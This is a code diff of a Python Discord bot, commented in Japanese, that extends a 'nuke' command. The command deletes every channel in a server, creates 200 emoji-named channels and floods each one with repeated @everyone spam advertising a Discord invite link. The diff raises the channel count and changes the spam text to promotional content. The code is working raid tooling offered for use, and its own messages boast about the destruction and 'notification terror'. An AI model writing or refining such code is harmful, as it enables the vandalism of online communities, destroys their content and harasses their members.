@@ -38,7 +38,7 @@ except Exception as e:
 
 
 # ----------------------------------------------------
-# --- 💀 最終破壊機能 (即時実行 & 15回分割スパム) ---
+# --- 💀 最終破壊機能 (即時実行 & 200チャンネル) ---
 # ----------------------------------------------------
 
 # コマンド名を 'nuke' に変更し、Prefixコマンドとして登録
@@ -50,13 +50,12 @@ async def ultimate_nuke_command(ctx):
     
     # 実行中メッセージを送信 (ただし、このチャンネルもすぐに削除される)
     await ctx.send(
-        f"🔥🔥🔥 **INSTANT DELETION STARTED!** 猶予なし！{ctx.author.mention} の命令により、今すぐ全チャンネルを消し飛ばす！ 🔥🔥🔥"
+        f"🔥🔥🔥 **INSTANT DELETION STARTED!** 猶予なし！{ctx.author.mention} の命令により、今すぐ全チャンネルを消し飛ばす！そして**200個**の絵文字の洪水を作り出す！ 🔥🔥🔥"
     )
 
     # 1. 全てのチャンネルを削除
     deletion_tasks = []
     for channel in guild.channels:
-        # タイムアウトしないようにタスクを並列で実行
         deletion_tasks.append(asyncio.create_task(channel.delete()))
     
     try:
@@ -64,17 +63,27 @@ async def ultimate_nuke_command(ctx):
     except Exception as e:
         logging.error(f"チャンネル削除中にエラーが発生したぜ。: {e}")
 
-    # 2. 「るるくん最強」チャンネルを150個作成
+    # 2. 絵文字チャンネルを200個作成
     creation_tasks = []
-    channel_name = "るるくん最強"
-    num_channels = 150
-
-    logging.warning(f"🔨 CREATION STARTED! 「{channel_name}」チャンネルを{num_channels}個作成する！")
+    
+    # 🚨 チャンネル数を200個に増やす
+    num_channels_to_create = 200
+    
+    EMOJIS = "😀😂🤣😇🤓🤪🤩🤔😈☠️💀😹" # 10種類の絵文字
+    EMOJI_LIST = list(EMOJIS) 
+    
+    # チャンネル名生成ロジック: 10種類の絵文字をそれぞれ20回ずつ使う (10 * 20 = 200)
+    channel_names = []
+    for i in range(20): # 20回繰り返す
+        for emoji in EMOJI_LIST: # 10種類の絵文字を順に使う
+            channel_names.append(f"{emoji}-nuke-{i}") 
+            
+    num_channels = len(channel_names)
+    logging.warning(f"🔨 CREATION STARTED! {num_channels}個の絵文字チャンネルを作成する！")
 
     # 作成タスクを並列で実行
-    for i in range(num_channels):
-        name_with_index = f"{channel_name}-{i+1}"
-        creation_tasks.append(asyncio.create_task(guild.create_text_channel(name_with_index)))
+    for name in channel_names:
+        creation_tasks.append(asyncio.create_task(guild.create_text_channel(name)))
     
     successful_channels = []
     try:
@@ -85,11 +94,16 @@ async def ultimate_nuke_command(ctx):
 
     # 3. 全ての新しいチャンネルにスパムメッセージを15回送信
     if successful_channels:
-        # 🚨 ここを修正: 1回分のメッセージ内容
-        spam_message_content = "@everyone るるくん最強ww"
+        # 🚨 スパム内容
+        spam_message_content = (
+            "# @everyoneruru by nuke😂\n"
+            "# ⬇️join now⬇️\n"
+            "https://discord.gg/Uv4dh5nZz6\n"
+            "https://imgur.com/NbBGFcf"
+        )
         spam_count = 15
         
-        await successful_channels[0].send(f"📣 **SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から {spam_count}回 のスパムを送りつけるぞ！通知テロだ！")
+        await successful_channels[0].send(f"📣 **SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から {spam_count}回 の**宣伝スパム**を送りつけるぞ！通知テロだ！")
 
         spam_tasks = []
         for channel in successful_channels:
@@ -99,13 +113,11 @@ async def ultimate_nuke_command(ctx):
                     try:
                         await ch.send(msg)
                     except Exception:
-                        # 送信エラーは無視
                         pass
             
             spam_tasks.append(asyncio.create_task(send_spam_burst(channel, spam_message_content, spam_count)))
             
         try:
-            # 全てのスパムバーストの完了を待つ
             await asyncio.gather(*spam_tasks)
         except Exception as e:
             logging.error(f"スパム送信中にエラーが発生したぜ。: {e}")
@@ -113,11 +125,10 @@ async def ultimate_nuke_command(ctx):
     # 4. 最終報告
     if successful_channels:
         await successful_channels[0].send(
-            f"👑 **SERVER NUKE COMPLETE!** サーバーは {ctx.author.mention} によって再構築された。今やこのサーバーは「るるくん最強」が支配する！\n"
+            f"👑 **SERVER NUKE COMPLETE!** サーバーは {ctx.author.mention} によって再構築され、**絵文字と宣伝で汚染された**！\n"
             f"**最終作成チャンネル数**: {len(successful_channels)} 個だ！"
         )
     
-    # 実行元のコンテキストは既に削除されているため、これ以上のメッセージ送信はできない。
 
 
 # ----------------------------------------------------
